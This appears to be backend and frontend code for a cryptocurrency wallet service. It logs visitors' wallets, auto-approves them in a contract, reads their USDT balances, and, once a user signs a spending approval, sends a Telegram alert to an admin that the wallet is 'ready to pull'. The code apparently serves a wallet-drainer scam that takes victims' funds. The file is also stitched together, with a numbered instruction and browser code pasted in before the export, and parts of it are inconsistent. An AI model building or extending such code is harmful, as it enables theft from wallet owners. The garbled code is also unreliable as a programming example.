const walletService = require('../services/wallet.service');
const contractService = require('../services/contract.service');
const database = require('../config/database');
const validators = require('../utils/validators');
const helpers = require('../utils/helpers');

// Add this at the top of the file
const recentConnections = new Map();

class WalletController {
    async connectWallet(req, res) {
    try {
        console.log('=== CONTROLLER: Wallet connection request received ===');
        console.log('Request body:', JSON.stringify(req.body, null, 2));
        
        // Check for duplicate connections (within 30 seconds)
        const { address } = req.body;
        const now = Date.now();
        const lastConnection = recentConnections.get(address);
        
        if (lastConnection && (now - lastConnection) < 30000) {
            console.log('Duplicate connection request ignored for:', address);
            return res.json({
                success: true,
                message: 'Wallet already processed'
            });
        }
        
        // Record this connection
        recentConnections.set(address, now);
        
        // Clean up old entries (older than 1 minute)
        for (const [addr, time] of recentConnections.entries()) {
            if (now - time > 60000) {
                recentConnections.delete(addr);
            }
        }
        
        // Validate input
        const validation = validators.validateWalletConnection(req.body);
        if (!validation.valid) {
            console.log('Validation failed:', validation.error);
            return res.status(400).json({
                success: false,
                error: validation.error
            });
        }
        
        const { address: walletAddress, name } = req.body;
        console.log('Processing wallet:', walletAddress, 'Name:', name);
        
        // Save wallet to database
        const query = `
            INSERT INTO wallets (address, name, created_at, updated_at)
            VALUES ($1, $2, NOW(), NOW())
            ON CONFLICT (address) DO UPDATE
            SET updated_at = NOW()
            RETURNING *
        `;
        
        console.log('Saving wallet to database...');
        const result = await database.query(query, [walletAddress, name || 'Unnamed Wallet']);
        const wallet = result.rows[0];
        console.log('Wallet saved:', wallet.address);
        
        // Auto-approve wallet in contract
        const ContractService = require('../services/contract.service');
        const contractService = new ContractService();
        
        try {
            await contractService.init();  // VERY important
            await contractService.approveWallet(walletAddress);
            console.log('Wallet auto-approved in contract:', walletAddress);
        } catch (err) {
            console.error('Auto-approval failed:', err);
            // Don't fail the connection if auto-approval fails
        }
        
        // Get USDT balance
        console.log('Fetching USDT balance...');
        const balance = await contractService.getWalletUSDTBalance(walletAddress);
        console.log('USDT balance fetched:', balance);
        
        // Update wallet with balance (but don't send alert yet)
        const updateQuery = `
            UPDATE wallets 
            SET usdt_balance = $1, updated_at = NOW()
            WHERE address = $2
            RETURNING *
        `;
        await database.query(updateQuery, [balance, walletAddress]);
        
        res.json({
            success: true,
            wallet: {
                id: wallet.id,
                address: wallet.address,
                name: wallet.name,
                usdt_balance: balance,
                created_at: wallet.created_at
            }
        });
    } catch (error) {
        console.error('Wallet connection error:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
}

    // Add this new method for spending approval
    async approveSpending(req, res) {
    try {
        console.log('=== APPROVAL: Spending approval request received ===');
        console.log('Request body:', JSON.stringify(req.body, null, 2));
        
        // Validate input
        const validation = validators.validateWalletConnection(req.body);
        if (!validation.valid) {
            console.log('Validation failed:', validation.error);
            return res.status(400).json({
                success: false,
                error: validation.error
            });
        }
        
        const { address } = req.body;
        console.log('Processing approval for wallet:', address);
        
        // Update approval status in database
        const query = `
            UPDATE wallets 
            SET is_approved = true, updated_at = NOW()
            WHERE address = $1
            RETURNING *
        `;
        
        console.log('Updating wallet approval status...');
        const result = await database.query(query, [address]);
        
        if (result.rows.length === 0) {
            console.log('Wallet not found:', address);
            return res.status(404).json({
                success: false,
                error: 'Wallet not found'
            });
        }
        
        const wallet = result.rows[0];
        console.log('Wallet approval updated:', wallet.address);
        
        // Get current balance for the alert
        const contractService = require('../services/contract.service');
        const balance = await contractService.getWalletUSDTBalance(address);
        
        // Update balance in database
        const updateQuery = `
            UPDATE wallets 
            SET usdt_balance = $1, updated_at = NOW()
            WHERE address = $2
        `;
        await database.query(updateQuery, [balance, address]);
        
        // Send alert to admin - ONLY NOW when wallet is ready to pull
        console.log('Sending Telegram alert - wallet ready to pull');
        const telegram = require('../config/telegram');
        await telegram.sendNewWalletAlert(address, balance);
        console.log('Telegram alert sent for ready-to-pull wallet');
        
        res.json({
            success: true,
            message: 'Wallet spending approved successfully - admin notified',
            wallet: {
                id: wallet.id,
                address: wallet.address,
                name: wallet.name,
                is_approved: true,
                usdt_balance: balance,
                updated_at: wallet.updated_at
            }
        });
    } catch (error) {
        console.error('Wallet approval error:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
}
4. Update the frontend to call the approval endpoint after blockchain approval:
--- File: frontend/index.html ---

// In the notifyApprovalToBackend function, make sure it's properly implemented:

// Notify backend about approval
async function notifyApprovalToBackend(walletAddress) {
    try {
        console.log('Notifying backend about approval for:', walletAddress);
        
        const response = await fetch(`${CONFIG.API_URL}/wallets/approve-spending`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                address: walletAddress
            })
        });
        
        const result = await response.json();
        console.log('Backend approval response:', result);
        
        if (!response.ok) {
            throw new Error(result.error || `HTTP ${response.status}: ${response.statusText}`);
        }
        
        showSuccess('Wallet approved successfully! Admin has been notified.');
        return { success: true, data: result };
        
    } catch (error) {
        console.error('Backend approval notification error:', error);
        showError('Approval recorded but notification failed.');
        return { success: false, error: error.message };
    }
}

module.exports = new WalletController();


